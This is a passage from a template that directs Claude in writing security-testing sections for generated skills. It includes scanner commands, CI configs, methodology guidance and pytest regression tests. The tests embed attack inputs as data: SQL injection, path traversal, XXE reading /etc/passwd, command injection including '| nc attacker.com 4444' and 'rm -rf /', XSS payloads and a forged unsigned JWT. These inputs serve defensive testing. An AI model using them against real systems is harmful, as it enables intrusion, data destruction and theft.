        return ValidationSuccess("Security test validation not required")

    test_coverage = {}
    for category, tests in required_security_tests.items():
        for test_name, validator in tests.items():
            test_coverage[f"{category}.{test_name}"] = validator(skill_content)

    # Minimum requirements for HIGH-RISK:
    minimum_examples = 3  # At least 3 security test examples with code

    documented_tests = [t for t, present in test_coverage.items() if present]

    if len(documented_tests) < minimum_examples:
        return ValidationFailure(
            f"Only {len(documented_tests)} security tests documented (need {minimum_examples}+)"
        )

    # Check test categories covered:
    categories_covered = {cat for test, present in test_coverage.items()
                          if present for cat in [test.split('.')[0]]}

    if len(categories_covered) < 3:  # Need coverage from 3+ categories
        return ValidationFailure(
            f"Only {len(categories_covered)} test categories covered (need 3+)"
        )

    return ValidationSuccess(
        f"{len(documented_tests)} security tests across {len(categories_covered)} categories"
    )
```

---

### Security Test Requirements

**For HIGH-RISK domains, Claude MUST document AT LEAST:**

**✅ REQUIRED TEST CATEGORIES:**

1. **Injection Prevention Tests** (pick at least 1):
   - SQL injection test example
   - NoSQL injection test (if applicable)
   - Command injection test
   - Template injection test (if applicable)

2. **Authentication Tests** (at least 1):
   - Authentication bypass attempt test
   - Token validation test
   - Session management test
   - MFA bypass test (if applicable)

3. **Authorization Tests** (at least 1):
   - Access control test (user can't access other user's data)
   - Privilege escalation test (user can't become admin)
   - Resource-level authorization test

**MINIMUM REQUIREMENT**: 3+ security test examples with full code

**Each test example MUST include:**
- ✅ Test function name and purpose
- ✅ Complete, runnable test code
- ✅ Assertions that verify security property
- ✅ Comments explaining what attack is being prevented
- ✅ Expected behavior (test should pass with secure code)

---

###Validation Failure Response

**IF security testing incomplete, Claude MUST output:**

```
❌ SECURITY TESTING VALIDATION FAILED ❌

Risk Level: HIGH
HIGH-RISK domains require comprehensive security testing documentation.

Test Coverage:
✅ Injection Tests:
   ✅ SQL injection test (documented with code)
   ❌ Command injection test (missing)

❌ Authentication Tests:
   ❌ Auth bypass test (missing)
   ❌ Token validation test (missing)

✅ Authorization Tests:
   ✅ Access control test (documented with code)

❌ Input Validation Tests:
   ❌ Boundary value tests (missing)

Security Test Examples: 2 (need 3+)
Test Categories Covered: 2 (need 3+)

⛔ Insufficient security testing documentation ⛔

HIGH-RISK skills must show developers HOW to test for security vulnerabilities.

Requirements:
✅ Minimum 3 security test examples with complete code
✅ Cover at least 3 test categories (injection, auth, authz, input validation)
✅ Each test must have assertions and comments
✅ Tests must be runnable (not pseudocode)

Action required:
1. Add at least 1 more security test example
2. Ensure coverage from 3+ categories
3. Provide complete test code (not just descriptions)

Task paused until security testing documentation complete.
```

---

### Success Response

**IF security testing complete, Claude MUST output:**

```
✅ SECURITY TESTING VALIDATION PASSED ✅

Risk Level: HIGH

Test Coverage:
✅ Injection Tests (2 examples):
   - SQL injection prevention test
   - Command injection prevention test

✅ Authentication Tests (2 examples):
   - Auth bypass attempt test
   - Token expiration test

✅ Authorization Tests (2 examples):
   - Access control test (BOLA prevention)
   - Privilege escalation test

✅ Input Validation Tests (1 example):
   - Malformed input handling test

Security Test Examples: 7 (exceeds minimum of 3) ✅
Test Categories Covered: 4 ✅
All tests include:
  ✅ Complete runnable code
  ✅ Security assertions
  ✅ Explanatory comments

Proceeding with skill generation.
```

---

### Post-Generation Validation

**After skill generation, Claude MUST validate:**

```
📋 GATE 6.X SECURITY TESTING VALIDATION: COMPLETE

Security Test Examples: 7 ✅
Test Categories Covered: 4/4 ✅
  ✅ Injection prevention tests: 2
  ✅ Authentication tests: 2
  ✅ Authorization tests: 2
  ✅ Input validation tests: 1

All tests include:
  ✅ Complete, runnable code
  ✅ Assertions verifying security properties
  ✅ Comments explaining prevented attacks
  ✅ Framework-specific syntax (pytest/jest/etc.)

✅ Security testing documentation meets HIGH-RISK requirements
```

---

### Test Example Quality Standards

**MANDATORY format for security tests (HIGH-RISK):**

```markdown
#### Security Test Example: SQL Injection Prevention

```python
import pytest
from fastapi.testclient import TestClient

def test_sql_injection_prevented():
    """
    Test that SQL injection attempts are blocked.

    Security property: User input in database queries must not
    allow attackers to manipulate query logic.
    """
    client = TestClient(app)

    # Attempt SQL injection via malicious username
    malicious_username = "admin' OR '1'='1' --"

    response = client.post("/login", json={
        "username": malicious_username,
        "password": "any_password"
    })

    # Should return 401 Unauthorized, NOT 200 OK
    # If vulnerable, attacker would bypass auth and get 200
    assert response.status_code == 401, \
        "SQL injection attempt should fail authentication"

    # Verify no user data leaked
    assert "user_id" not in response.json()
    assert "token" not in response.json()
```

**Why this test is important:**
- Verifies parameterized queries are used
- Ensures malicious input doesn't bypass authentication
- Detects if string formatting is used for SQL queries

**Attack prevented:** SQL injection authentication bypass
```

---

### Exception Handling by Risk Level

**MEDIUM-RISK domains:**
- Security testing RECOMMENDED but not blocking
- Minimum 2 security test examples
- Cover injection + one other category

**LOW-RISK domains:**
- Security testing OPTIONAL
- Can document general testing approach
- Code examples helpful but not required

---

**Template Instructions**:
- **HIGH-RISK**: ALL security testing types mandatory (SAST, DAST, dependency scan, fuzzing) + 3+ test examples
- **MEDIUM-RISK**: SAST + dependency scanning mandatory, DAST/fuzzing recommended + 2 test examples
- **LOW-RISK**: SAST mandatory, test examples optional

**Example Structure**:
```markdown
### 6.1 Security Testing Requirements

#### SAST (Static Application Security Testing)

**Required Tools**:
```bash
# Language-specific SAST tools

# Python
bandit -r src/ -ll  # Security linter
semgrep --config=auto src/  # Pattern-based scanner

# JavaScript/TypeScript
npm audit  # Dependency vulnerabilities
eslint --plugin security  # Security rules

# Java
spotbugs -effort:max -low security.jar  # Static analysis

# Go
gosec ./...  # Go security checker

# Rust
cargo audit  # Dependency audit
cargo clippy -- -D warnings  # Linter with security checks
```

**CI/CD Integration**:
```yaml
# Example: GitHub Actions
name: Security Scan
on: [push, pull_request]
jobs:
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run Bandit
        run: |
          pip install bandit
          bandit -r src/ -f json -o bandit-report.json
      - name: Run Semgrep
        run: |
          pip install semgrep
          semgrep --config=auto --json -o semgrep-report.json src/
      - name: Upload results
        if: always()
        uses: actions/upload-artifact@v3
        with:
          name: security-reports
          path: |
            bandit-report.json
            semgrep-report.json
```

#### DAST (Dynamic Application Security Testing)

**For Web Applications/APIs** (HIGH-RISK domains):

```bash
# OWASP ZAP baseline scan
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://api.example.com \
  -r zap-report.html

# Nuclei (vulnerability scanner)
nuclei -u https://api.example.com -t cves/ -t exposures/

# Custom security tests
pytest tests/security/ --cov=src --cov-report=html
```

**API Security Testing**:
```python
# Test: API security headers
def test_security_headers():
    response = client.get("/api/health")

    # Check security headers
    assert "X-Content-Type-Options" in response.headers
    assert response.headers["X-Content-Type-Options"] == "nosniff"

    assert "X-Frame-Options" in response.headers
    assert response.headers["X-Frame-Options"] == "DENY"

    assert "Strict-Transport-Security" in response.headers
    assert "Content-Security-Policy" in response.headers

# Test: CORS configuration
def test_cors_policy():
    response = client.options("/api/users", headers={"Origin": "https://evil.com"})

    # Should not allow arbitrary origins
    assert response.headers.get("Access-Control-Allow-Origin") != "*"
    assert response.headers.get("Access-Control-Allow-Origin") != "https://evil.com"
```

#### Dependency Scanning

**Automated Vulnerability Scanning**:

```bash
# Python
pip-audit  # Scan for known vulnerabilities
safety check --json  # Alternative scanner

# Node.js
npm audit  # Built-in audit
npm audit fix  # Auto-fix vulnerabilities
snyk test  # Snyk scanner

# Rust
cargo audit  # RustSec advisory scanner

# Go
govulncheck ./...  # Official Go vulnerability scanner

# Java/Maven
mvn org.owasp:dependency-check-maven:check

# Container images
trivy image myapp:latest  # Container vulnerability scanner
grype myapp:latest  # Alternative scanner
```

**CI/CD Integration**:
```yaml
# Fail build on HIGH/CRITICAL vulnerabilities
name: Dependency Scan
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run pip-audit
        run: |
          pip install pip-audit
          pip-audit --desc  # Descriptive output
          pip-audit --format json --output audit.json
      - name: Check for HIGH/CRITICAL
        run: |
          # Fail if HIGH or CRITICAL vulnerabilities found
          if grep -i "CRITICAL\|HIGH" audit.json; then
            echo "HIGH/CRITICAL vulnerabilities found!"
            exit 1
          fi
```

#### Fuzzing (for Input Handling)

**For Parsers, APIs, File Handlers** (recommended for High/Medium risk):

```python
# Example: Atheris (Python fuzzing)
import atheris
import sys

def test_parse_user_input(data):
    """Fuzz test for input parser."""
    try:
        parse_user_input(data)
    except ValueError:
        # Expected for invalid input
        pass
    except Exception as e:
        # Unexpected exception - potential bug/vulnerability
        raise

atheris.Setup(sys.argv, test_parse_user_input)
atheris.Fuzz()

# Example: AFL++ (general-purpose fuzzer)
# Compile with AFL instrumentation
afl-gcc -o parser_fuzz parser.c

# Run fuzzer
afl-fuzz -i input_corpus/ -o findings/ ./parser_fuzz @@
```

**Security Testing Checklist**:
- [ ] SAST integrated into CI/CD pipeline
- [ ] SAST scans run on every commit/PR
- [ ] Dependency scanning automated (daily + on every dependency change)
- [ ] DAST scans for web apps/APIs (at least weekly in staging)
- [ ] Fuzzing for input handlers (continuous or weekly)
- [ ] Security test results reviewed before merge
- [ ] HIGH/CRITICAL vulnerabilities block deployment
- [ ] Security scan reports archived for audit
```

---

#### 6.1.5 Security Regression Testing (MANDATORY)

**Principle**: Every security vulnerability found MUST have a test to ensure it never resurfaces.

```markdown
### Security Regression Test Suite

**Automated Tests for Fixed Vulnerabilities**:
```[language]
# ✅ Test suite for security regressions
import pytest

class TestSecurityRegressions:
    """
    MANDATORY: For every CVE/security bug fixed, add a test here.
    Tests MUST:
    1. Fail on vulnerable code
    2. Pass after fix
    3. Run in CI/CD forever (never delete)
    """

    def test_CVE_2024_001_sql_injection_fixed(self):
        """
        Bug: SQL injection in user search endpoint
        Fixed: 2024-01-15
        Commit: abc123def
        """
        # Attempt SQL injection
        malicious_input = "1' OR '1'='1'--"
        response = self.client.get(f'/api/users?id={malicious_input}')

        # Should reject malicious input
        assert response.status_code == 400
        assert 'Invalid input' in response.json()['error']

        # Should NOT return all users
        assert 'users' not in response.json()

    def test_SEC_2024_002_auth_bypass_via_header_fixed(self):
        """
        Bug: Authentication bypass via X-Forwarded-For header
        Fixed: 2024-01-20
        Pentester: John Doe
        """
        # Attempt to bypass auth with spoofed header
        response = self.client.get(
            '/api/admin/users',
            headers={'X-Forwarded-For': '127.0.0.1'}  # Spoof internal IP
        )

        # Should require authentication
        assert response.status_code == 401
        assert 'Unauthorized' in response.json()['error']

    def test_SEC_2024_003_rate_limiting_enforced(self):
        """
        Bug: No rate limiting on login endpoint
        Fixed: 2024-02-01
        Impact: Brute force attacks possible
        """
        # Attempt 150 requests (limit is 100)
        responses = []
        for i in range(150):
            response = self.client.post('/api/auth/login', json={
                'username': f'test{i}',
                'password': 'password'
            })
            responses.append(response.status_code)

        # Should rate limit after 100 requests
        assert 429 in responses  # Too Many Requests
        rate_limited_count = responses.count(429)
        assert rate_limited_count >= 50  # At least 50 blocked

    def test_SEC_2024_004_path_traversal_prevented(self):
        """
        Bug: Path traversal in file download endpoint
        Fixed: 2024-02-10
        Attack: ../../etc/passwd
        """
        # Attempt path traversal
        malicious_paths = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '%2e%2e%2f%2e%2e%2fetc%2fpasswd',  # URL encoded
        ]

        for path in malicious_paths:
            response = self.client.get(f'/api/files/download?path={path}')

            # Should block path traversal
            assert response.status_code in [400, 403, 404]
            assert 'passwd' not in response.text.lower()

    def test_SEC_2024_005_xxe_attack_prevented(self):
        """
        Bug: XXE (XML External Entity) injection
        Fixed: 2024-02-15
        Attack: External entity to read files
        """
        # Attempt XXE attack
        xxe_payload = """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <data>&xxe;</data>
        """

        response = self.client.post(
            '/api/xml/process',
            data=xxe_payload,
            headers={'Content-Type': 'application/xml'}
        )

        # Should reject XXE
        assert response.status_code == 400
        assert 'Invalid XML' in response.json()['error']
        assert 'root:' not in response.text  # /etc/passwd content

    def test_SEC_2024_006_idor_fixed(self):
        """
        Bug: IDOR (Insecure Direct Object Reference)
        Fixed: 2024-03-01
        Impact: Users could access other users' data
        """
        # User A tries to access User B's data
        user_a_token = self.get_auth_token('user_a')
        user_b_id = self.get_user_id('user_b')

        response = self.client.get(
            f'/api/users/{user_b_id}/profile',
            headers={'Authorization': f'Bearer {user_a_token}'}
        )

        # Should deny access
        assert response.status_code == 403
        assert 'Forbidden' in response.json()['error']

    def test_SEC_2024_007_csrf_protection_enabled(self):
        """
        Bug: No CSRF protection on state-changing endpoints
        Fixed: 2024-03-10
        Impact: CSRF attacks possible
        """
        # Attempt state-changing request without CSRF token
        response = self.client.post(
            '/api/users/delete',
            json={'user_id': '123'},
            # No CSRF token in headers
        )

        # Should reject without CSRF token
        assert response.status_code == 403
        assert 'CSRF' in response.json()['error']

    def test_SEC_2024_008_jwt_signature_verified(self):
        """
        Bug: JWT signature not verified (alg=none attack)
        Fixed: 2024-03-15
        Impact: Authentication bypass
        """
        # Create unsigned JWT (alg=none)
        import base64
        import json

        header = base64.b64encode(json.dumps({
            "alg": "none",
            "typ": "JWT"
        }).encode()).decode()

        payload = base64.b64encode(json.dumps({
            "user_id": "admin",
            "role": "admin"
        }).encode()).decode()

        unsigned_token = f"{header}.{payload}."

        response = self.client.get(
            '/api/admin/users',
            headers={'Authorization': f'Bearer {unsigned_token}'}
        )

        # Should reject unsigned JWT
        assert response.status_code == 401
        assert 'Invalid token' in response.json()['error']

    def test_SEC_2024_009_command_injection_prevented(self):
        """
        Bug: Command injection in system utility endpoint
        Fixed: 2024-03-20
        Attack: ; cat /etc/passwd
        """
        # Attempt command injection
        malicious_inputs = [
            '; cat /etc/passwd',
            '| whoami',
            '&& ls -la',
            '`cat /etc/passwd`',
            '$(cat /etc/passwd)',
        ]

        for payload in malicious_inputs:
            response = self.client.post('/api/utils/ping', json={
                'host': f'8.8.8.8{payload}'
            })

            # Should reject command injection
            assert response.status_code == 400
            assert 'Invalid input' in response.json()['error']
            assert 'root:' not in response.text

    def test_SEC_2024_010_mass_assignment_prevented(self):
        """
        Bug: Mass assignment vulnerability
        Fixed: 2024-04-01
        Impact: Users could set is_admin=true
        """
        # Attempt to elevate privileges via mass assignment
        response = self.client.post('/api/users/register', json={
            'username': 'attacker',
            'email': 'attacker@evil.com',
            'password': 'password123',
            'is_admin': True,  # Attacker trying to set admin flag
            'role': 'admin'     # Attacker trying to set admin role
        })

        # Registration should succeed but not grant admin
        assert response.status_code == 201

        # Verify user is NOT admin
        user_id = response.json()['id']
        user = self.get_user(user_id)
        assert user['is_admin'] is False
        assert user['role'] == 'user'  # Default role
```

**Security Regression Test Requirements**:
- [ ] Every CVE/security bug gets a permanent test
- [ ] Tests MUST fail on vulnerable code
- [ ] Tests MUST pass after fix
- [ ] Tests run in CI/CD on every commit
- [ ] Tests NEVER deleted (security regression = critical bug)
- [ ] Each test documents: Bug ID, fix date, commit hash, impact
- [ ] Tests cover all attack vectors from pentest findings
```

---

### 6.2 Testing Methodologies & Strategy

**Template Instructions**:
- **CRITICAL**: Specify which testing methodology to use based on domain characteristics
- Use the decision framework below to recommend the appropriate testing approach
- For EVERY skill, include testing strategy recommendation in Section 6.2
- Adapt code examples to your domain's language/framework

**Decision Framework**:
1. **TDD (Test-Driven Development)**: Default for all new development
2. **Add Property-Based Testing**: For parsers, algorithms, data structures
3. **Add BDD/ATDD**: When non-technical stakeholders are involved
4. **Add Mutation Testing**: Monthly audits for security-critical codebases

---

**Example Structure**:
```markdown
### 6.2 Testing Strategy & Methodologies

**Recommended Testing Approach**: [Choose based on domain]

---

#### Primary Methodology: TDD (Test-Driven Development)

**What it is**: Write tests BEFORE implementation code using the Red-Green-Refactor cycle.

**Red-Green-Refactor Cycle**:
```
🔴 RED: Write a failing test
    ↓
🟢 GREEN: Write minimal code to make it pass
    ↓
🔵 REFACTOR: Improve code while keeping tests green
    ↓
↻ REPEAT
```

**Example for [your domain]**:

```[language]
# Step 1: 🔴 RED - Write failing test
def test_[domain_function]():
    """Test [specific behavior]."""
    result = [function_name]([inputs])
    assert result == [expected_output]
    # ❌ FAILS: Function doesn't exist yet

# Step 2: 🟢 GREEN - Minimal implementation
def [function_name]([params]):
    """[Brief description]."""
    return [minimal_working_code]
    # ✅ PASSES

# Step 3: Add validation test
def test_[domain_function]_validation():
    """Test that invalid input is rejected."""
    with pytest.raises([ErrorType]):
        [function_name]([invalid_input])
    # ❌ FAILS: No validation yet

# Step 4: Add validation
def [function_name]([params]):
    if not [validation_check]:
        raise [ErrorType]("[error_message]")
    return [implementation]
    # ✅ PASSES

# Step 5: 🔵 REFACTOR - Extract, improve, maintain green tests
```

**When to use TDD**:
- ✅ Building new features from scratch
- ✅ Complex business logic
- ✅ Security-critical code
- ✅ APIs and libraries
- ✅ Clear requirements

**When NOT to use TDD**:
- ❌ Prototyping/exploration (add tests after proof-of-concept)
- ❌ UI/visual design (manual testing more effective)
- ❌ Simple CRUD with framework scaffolding

**Tools**: [Specify for your domain language]

---

#### Complementary Methodology: Property-Based Testing

[**INCLUDE IF**: Domain involves parsers, algorithms, encoders/decoders, data transformations, mathematical operations]

**What it is**: Framework generates hundreds of test cases automatically to find edge cases.

**Example for [your domain]**:

```[language]
# Traditional example-based test
def test_[function]_examples():
    assert [function]([input1]) == [output1]
    assert [function]([input2]) == [output2]

# Property-based test (finds edge cases automatically!)
from hypothesis import given, strategies as st

@given(st.[strategy_type]())
def test_[function]_properties(input_data):
    """Property: [Describe invariant that should always hold]"""
    result = [function](input_data)

    # Test invariant properties
    assert [property1]  # e.g., len(result) == len(input_data)
    assert [property2]  # e.g., result is idempotent

# When test fails, Hypothesis automatically shrinks to minimal failing case
```

**Use Property-Based Testing for**:
- Parsers and serializers
- Encoders/decoders
- Data structure invariants
- Mathematical functions
- Transformation pipelines

**Tools**: [Specify for your domain]
- Python: Hypothesis
- JavaScript/TypeScript: fast-check
- Java: jqwik
- Go: gopter
- Rust: proptest, quickcheck

---

#### Stakeholder Collaboration: BDD/ATDD

[**INCLUDE IF**: Domain has complex acceptance criteria, regulatory requirements, or non-technical stakeholders]

**BDD (Behavior-Driven Development)**: Given-When-Then scenarios

**Example for [your domain]**:

```gherkin
Feature: [Domain Feature Name]
  As a [user type]
  I want to [action]
  So that [business value]

  Scenario: [Happy path scenario]
    Given [precondition]
    When [action]
    Then [expected outcome]

  Scenario: [Error scenario]
    Given [precondition]
    When [invalid action]
    Then [error message or behavior]
```

**ATDD (Acceptance Test-Driven Development)**: Executable acceptance criteria

```[language]
def test_acceptance_criteria_1():
    """AC1: [Acceptance criterion from product owner]"""
    # Arrange
    [setup]

    # Act
    [perform_action]

    # Assert
    [verify_business_outcome]
```

**Use BDD/ATDD when**:
- Non-technical stakeholders need to understand/approve tests
- Regulatory compliance requires documented test cases
- Complex acceptance criteria need validation
- User-facing features with clear business rules

**Tools**: [Specify for your domain]
- BDD: Cucumber, Behave, SpecFlow
- ATDD: Standard unit test frameworks with descriptive names

---

#### Test Quality Audit: Mutation Testing

[**INCLUDE IF**: Security-critical domain, financial systems, healthcare, or HIGH-RISK category]

**What it is**: Validates test quality by introducing bugs and checking if tests catch them.

**Example**:

```bash
# Python
pip install mutmut
mutmut run --paths-to-mutate=[your_module]

# JavaScript
npm install -g stryker-cli
stryker run

# Java
mvn org.pitest:pitest-maven:mutationCoverage

# Go
go-mutesting [package]
```

**Mutation Score Target**: >75% for critical code paths

**Use Mutation Testing**:
- Monthly or quarterly audits (NOT in CI/CD - too slow)
- Before major releases
- For security-critical modules
- To validate test suite quality

---

### Testing Methodology Comparison

| Methodology | Speed | Complexity | Best For | Stakeholder Involvement | Frequency |
|-------------|-------|------------|----------|-------------------------|-----------|
| **TDD** | Fast | Low | Day-to-day development, new features | None | Daily |
| **Property-Based** | Slow | High | Algorithms, parsers, data structures | None | Per critical module |
| **BDD** | Medium | Medium | User-facing features, acceptance | High (read tests) | Per feature |
| **ATDD** | Medium | Medium | Complex acceptance criteria | High (write criteria) | Per feature |
| **Mutation Testing** | Very Slow | Low | Test quality validation | None | Monthly/Quarterly |

---

### Recommended Testing Strategy for [Your Domain]

[**CLAUDE**: Based on domain analysis, recommend specific strategy]

**For this domain, use**:

1. **TDD as foundation** (daily development)
   - All new features start with failing tests
   - Target: >80% code coverage
   - Tools: [language-specific test framework]

2. **[IF domain has algorithms/parsers] Property-Based Testing** (critical paths)
   - Use for: [specific modules/functions]
   - Tools: [Hypothesis/fast-check/etc]

3. **[IF stakeholders involved] BDD/ATDD** (feature acceptance)
   - Use for: [user-facing features]
   - Tools: [Cucumber/Behave/etc]

4. **[IF HIGH-RISK] Mutation Testing** (monthly audits)
   - Schedule: [monthly/quarterly]
   - Target score: >75%
   - Tools: [mutmut/Stryker/PIT]

**Testing Workflow**:

```
New Feature Request
    ↓
1. Write acceptance criteria (ATDD if stakeholders involved)
    ↓
2. Write failing unit test (TDD)
    ↓
3. Implement minimal code to pass
    ↓
4. Add property-based tests if applicable
    ↓
5. Refactor with test safety net
    ↓
6. Run security tests (SAST, DAST)
    ↓
7. Deploy to staging
    ↓
8. [Monthly] Run mutation tests on critical modules
```

**Example Test Organization**:

```
tests/
├── unit/                    # TDD unit tests (fast, run on every commit)
│   ├── test_[module1].py
│   └── test_[module2].py
├── integration/             # Integration tests (run pre-commit)
│   └── test_[integration].py
├── property/                # Property-based tests (run in CI)
│   └── test_[module]_properties.py
├── acceptance/              # BDD/ATDD tests (run in CI)
│   ├── features/
│   │   └── [feature].feature
│   └── step_definitions/
├── security/                # Security-specific tests
│   └── test_security_requirements.py
└── conftest.py              # Shared fixtures
```

```

---

### 6.3 Unit & Integration Testing

**Example Structure**:
```markdown
### 6.3 Unit & Integration Testing

**Test Coverage Requirements**:
- Unit tests: >80% code coverage
- Integration tests: Cover all external boundaries
- Edge cases: Test boundary conditions, empty inputs, maximum values
- Error cases: Test all error paths

**Testing Framework Selection**:

| Language | Unit Testing | Mocking | Property-Based |
|----------|--------------|---------|----------------|
| Python | pytest, unittest | unittest.mock, pytest-mock | Hypothesis |
| JavaScript/TypeScript | Jest, Vitest | Jest mocks | fast-check |
| Java | JUnit 5 | Mockito | jqwik |
| Go | testing package | testify/mock | gopter |
| Rust | built-in `#[test]` | mockall | proptest, quickcheck |

**Example: Unit Tests**:

```python
# Unit test structure
import pytest
from hypothesis import given, strategies as st

def test_user_creation_happy_path():
    """Test successful user creation."""
    user = create_user(username="alice", email="alice@example.com")
    assert user.username == "alice"
    assert user.email == "alice@example.com"
    assert user.id is not None

def test_user_creation_invalid_email():
    """Test user creation with invalid email fails."""
    with pytest.raises(ValidationError, match="Invalid email"):
        create_user(username="bob", email="not-an-email")

def test_user_creation_duplicate_username():
    """Test duplicate username rejected."""
    create_user(username="charlie", email="charlie@example.com")

    with pytest.raises(BusinessValidationError, match="Username already taken"):
        create_user(username="charlie", email="charlie2@example.com")

# Edge cases
@pytest.mark.parametrize("username", [
    "a",  # Too short
    "a" * 100,  # Too long
    "admin",  # Reserved
    "user@123",  # Invalid characters
])
def test_user_creation_invalid_username(username):
    """Test invalid usernames are rejected."""
    with pytest.raises(ValidationError):
        create_user(username=username, email="test@example.com")
```

**Example: Integration Tests**:

```python
# Integration test with database
@pytest.fixture
def db_session():
    """Create test database session."""
    # Setup
    engine = create_test_engine()
    Base.metadata.create_all(engine)
    session = Session(engine)

    yield session

    # Teardown
    session.close()
    Base.metadata.drop_all(engine)

def test_user_registration_flow_integration(db_session, test_client):
    """Test complete user registration flow."""
    # Register user
    response = test_client.post("/api/register", json={
        "username": "dave",
        "email": "dave@example.com",
        "password": "SecureP@ssw0rd123"
    })
    assert response.status_code == 201
    user_id = response.json()["id"]

    # Verify user in database
    user = db_session.query(User).filter(User.id == user_id).first()
    assert user is not None
    assert user.username == "dave"

    # Verify password is hashed
    assert user.password_hash != "SecureP@ssw0rd123"
    assert user.password_hash.startswith("$2b$")  # bcrypt prefix

    # Verify login works
    response = test_client.post("/api/login", json={
        "username": "dave",
        "password": "SecureP@ssw0rd123"
    })
    assert response.status_code == 200
    assert "access_token" in response.json()
```

**Test Organization**:
```
tests/
├── unit/
│   ├── test_models.py
│   ├── test_services.py
│   └── test_validators.py
├── integration/
│   ├── test_api_endpoints.py
│   ├── test_database.py
│   └── test_external_services.py
├── security/
│   ├── test_authentication.py
│   ├── test_authorization.py
│   └── test_injection_prevention.py
└── conftest.py  # Shared fixtures
```
```

---

### 6.4 Security Test Examples

**Example Structure**:
```markdown
### 6.4 Security Test Examples

#### Authentication Bypass Attempts

```python
def test_tampered_token_rejected():
    """Test that tampered JWT tokens are rejected."""
    # Create valid token
    token = generate_jwt(user_id=1, role="user")

    # Tamper with token
    parts = token.split(".")
    tampered = ".".join([parts[0], parts[1], "AAAA" + parts[2][4:]])

    # Should reject tampered token
    response = client.get(
        "/api/protected",
        headers={"Authorization": f"Bearer {tampered}"}
    )
    assert response.status_code == 401

def test_expired_token_rejected():
    """Test that expired tokens are rejected."""
    # Create token that expires immediately
    token = generate_jwt(user_id=1, exp=datetime.utcnow() - timedelta(seconds=1))

    response = client.get(
        "/api/protected",
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 401
    assert "expired" in response.json()["error"].lower()

def test_no_token_rejected():
    """Test that requests without tokens are rejected."""
    response = client.get("/api/protected")
    assert response.status_code == 401
```

#### Injection Attack Prevention

```python
def test_sql_injection_prevented():
    """Test SQL injection attempts are safely handled."""
    malicious_inputs = [
        "admin' OR '1'='1",
        "'; DROP TABLE users; --",
        "admin'--",
        "1' UNION SELECT * FROM users --",
    ]

    for malicious_input in malicious_inputs:
        result = get_user_by_username(malicious_input)
        # Should return None, not execute malicious SQL
        assert result is None

def test_command_injection_prevented():
    """Test command injection attempts are prevented."""
    malicious_filenames = [
        "file.txt; rm -rf /",
        "file.txt && cat /etc/passwd",
        "file.txt | nc attacker.com 4444",
    ]

    for malicious in malicious_filenames:
        with pytest.raises((ValueError, SecurityError)):
            process_file(malicious)

def test_xss_prevented():
    """Test XSS payloads are sanitized."""
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
    ]

    for payload in xss_payloads:
        # Update user bio with XSS payload
        update_user_bio(user_id=1, bio=payload)

        # Retrieve and check it's escaped
        user = get_user(user_id=1)
        html = render_user_profile(user)

        # Should not contain executable script
        assert "<script>" not in html
        assert "onerror=" not in html
        assert "javascript:" not in html
```

#### Authorization Tests

```python
def test_regular_user_cannot_delete_admin_resource():
    """Test privilege escalation is prevented."""
    regular_user = create_user(role="user")
    admin_resource = create_resource(owner_role="admin")

    with pytest.raises(AuthorizationError):
        delete_resource(admin_resource.id, user=regular_user)

def test_user_cannot_access_other_user_data():
    """Test horizontal privilege escalation is prevented."""
    user_a = create_user(username="alice")
    user_b = create_user(username="bob")

    # Alice tries to access Bob's data
    with pytest.raises(AuthorizationError):
        get_user_profile(user_id=user_b.id, current_user=user_a)

def test_admin_can_access_all_resources():
    """Test admin has appropriate access."""
    admin = create_user(role="admin")
    user_resource = create_resource(owner_role="user")

    # Should succeed
    result = get_resource(user_resource.id, current_user=admin)
    assert result is not None
```

#### Rate Limiting Tests

```python
def test_rate_limiting_enforced():
    """Test that rate limiting prevents abuse."""
    # Make requests up to limit
    for i in range(100):
        response = client.get("/api/public-endpoint")
        assert response.status_code == 200

    # Next request should be rate limited
    response = client.get("/api/public-endpoint")
    assert response.status_code == 429
    assert "rate limit" in response.json()["error"].lower()

def test_authentication_rate_limiting():
    """Test brute force protection on login."""
    for i in range(5):
        response = client.post("/api/login", json={
            "username": "admin",
            "password": "wrong_password"
        })
        # First few attempts return 401
        assert response.status_code in [401, 429]

    # Should be rate limited after multiple failures
    response = client.post("/api/login", json={
        "username": "admin",
        "password": "any_password"
    })
    assert response.status_code == 429
```
```

---

### 6.5 Observability Implementation

**Example Structure**:
```markdown
### 6.5 Observability: Logging, Metrics & Tracing

#### Structured Logging

**Logging Library Selection**:

| Language | Recommended Library | Features |
|----------|---------------------|----------|
| Python | structlog, python-json-logger | Structured JSON logs |
| JavaScript/TypeScript | winston, pino | JSON logs, fast |
| Java | Logback, Log4j2 | Structured appenders |
| Go | zap, zerolog | High-performance structured |
| Rust | tracing, slog | Async structured logging |

**Implementation Example**:

```python
import structlog
from structlog.processors import JSONRenderer, TimeStamper

# Configure structured logging
structlog.configure(
    processors=[
        structlog.stdlib.add_log_level,
        structlog.stdlib.add_logger_name,
        TimeStamper(fmt="iso"),
        structlog.processors.StackInfoRenderer(),
        structlog.processors.format_exc_info,
        JSONRenderer()
    ],
    logger_factory=structlog.stdlib.LoggerFactory(),
    cache_logger_on_first_use=True,
)

logger = structlog.get_logger()

# ✅ Good logging practices
def process_payment(user_id: str, amount: Decimal, payment_method: str):
    correlation_id = str(uuid.uuid4())

    logger.info(
        "payment.initiated",
        user_id=hash_pii(user_id),  # ✅ Hash PII
        amount=str(amount),
        currency="USD",
        payment_method=payment_method,  # e.g., "credit_card"
        correlation_id=correlation_id
    )

    try:
        result = charge_payment(user_id, amount, payment_method)

        logger.info(
            "payment.completed",
            user_id=hash_pii(user_id),
            amount=str(amount),
            transaction_id=result.transaction_id,
            correlation_id=correlation_id,
            duration_ms=result.duration_ms
        )

        return result

    except PaymentError as e:
        logger.error(
            "payment.failed",
            user_id=hash_pii(user_id),
            amount=str(amount),
            error_type=type(e).__name__,
            error_message=str(e),  # ✅ Safe error message
            correlation_id=correlation_id
        )
        raise

# ❌ Bad logging practices
logger.info(f"User {user.email} logged in with password {password}")  # ❌ PII + secrets
